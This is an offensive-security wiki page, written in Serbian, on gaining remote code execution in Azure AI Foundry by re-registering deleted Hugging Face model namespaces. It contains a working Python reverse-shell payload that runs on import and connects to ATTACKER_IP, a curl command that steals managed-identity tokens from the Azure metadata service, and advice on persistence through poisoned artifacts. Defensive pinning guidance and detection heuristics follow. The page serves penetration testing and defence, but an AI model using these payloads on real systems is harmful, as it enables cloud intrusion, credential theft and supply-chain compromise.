# Azure - AI Foundry Post-Exploitation kroz Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Scenarij

- Katalog modela Azure AI Foundry uključuje mnoge Hugging Face (HF) modele za postavljanje jednim klikom.
- HF identifikatori modela su Author/ModelName. Ako je HF author/org obrisan, bilo ko može ponovo registrovati tog autora i objaviti model sa istim ModelName na legacy putanji.
- Pipelines i katalogi koji povlače po imenu (bez commit pinovanja/integriteta) će rešiti na repozitorijume pod kontrolom napadača. Kada Azure postavi model, loader code se može izvršiti u okruženju endpointa i dodeliti RCE sa dozvolama tog endpointa.

Uobičajeni slučajevi preuzimanja HF:
- Brisanje vlasništva: Stara putanja vraća 404 dok ne dođe do takeover-a.
- Prelazak vlasništva: Stara putanja vraća 307 ka novom authoru dok stari author postoji. Ako je stari author kasnije obrisan i ponovo registrovan, redirect prestaje da radi i repo napadača se servira na legacy putanji.

## Identifikovanje ponovo upotrebljivih namespace-a (HF)
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## End-to-end tok napada protiv Azure AI Foundry

1) U Model Catalog pronađite HF models čiji su originalni autori obrisani ili prebačeni (stari author uklonjen) na HF.  
2) Ponovo registrujte napuštenog autora na HF i ponovo kreirajte ModelName.  
3) Objavite maliciozni repo sa loader kodom koji se izvršava pri import ili zahteva trust_remote_code=True.  
4) Deploy-ujte legacy Author/ModelName iz Azure AI Foundry. Platforma povuče attacker repo; loader se izvršava unutar Azure endpoint container/VM, što rezultira RCE sa permisijama endpoint-a.

Example payload fragment executed on import (for demonstration only):
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Napomene
- AI Foundry deployments koji integrišu HF tipično kloniraju i importuju repo module koje referencira model’s config (npr. auto_map), što može dovesti do izvršavanja koda. Za neke putanje je potrebno trust_remote_code=True.
- Pristup obično odgovara dozvolama managed identity/service principal endpointa. Smatrajte ga početnim foothold-om za pristup podacima i lateral movement unutar Azure.

## Post-Exploitation Tips (Azure Endpoint)

- Istražite environment variables i MSI endpoints da biste pronašli tokene:
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- Proverite montirane skladišne lokacije, artefakte modela i dostupne Azure servise koristeći pribavljeni token.
- Razmotrite postojanost ostavljanjem poisoned model artifacts ako platforma ponovo preuzima iz HF.

## Smernice za odbranu za korisnike Azure AI Foundry

- Zaključajte modele po commit-u pri učitavanju iz HF:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Preslikajte proverenih HF modela u pouzdan interni registry i deploy-ujte ih odatle.
- Kontinuirano skenirajte codebase-ove i defaults/docstrings/notebooks u potrazi za hard-coded Author/ModelName koji su obrisani/prebačeni; ažurirajte ili pin-ujte.
- Proverite postojanje autora i poreklo modela pre deploymenta.

## Heuristike prepoznavanja (HTTP)

- Obrisani autor: author stranica 404; legacy model path 404 dok ne dođe do takeover-a.
- Prebačeni model: legacy path 307 na novog autora dok stari autor postoji; ako stari autor kasnije bude obrisan i ponovo registrovan, legacy path može služiti sadržaj napadača.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Međureferencije

- Pogledajte širu metodologiju i napomene o lancu snabdevanja:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Reference

- [Ponovna upotreba imenskog prostora modela: AI napad na lanac snabdevanja koji iskorišćava poverenje u ime modela (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Preimenovanje ili prenos repo-a](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
